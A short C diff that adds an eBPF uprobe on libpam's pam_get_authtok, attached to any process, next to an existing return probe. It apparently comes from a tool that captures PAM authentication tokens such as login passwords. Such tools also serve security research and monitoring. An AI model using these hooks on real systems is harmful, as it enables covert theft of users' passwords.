@@ -279,7 +279,14 @@ int main(int argc, char **argv)
         goto cleanup;
     }
     
-    // Attach userland probe 
+    // Attach userland probes
+    skel->links.get_addr_pam_get_authtok = bpf_program__attach_uprobe(
+        skel->progs.get_addr_pam_get_authtok,
+		false,           /* uprobe */
+		-1,             /* any pid */
+		env.libpam_path,       /* path to the lib*/
+		offset
+    );
     skel->links.trace_pam_get_authtok = bpf_program__attach_uprobe(
         skel->progs.trace_pam_get_authtok,
 		true,           /* uretprobe */
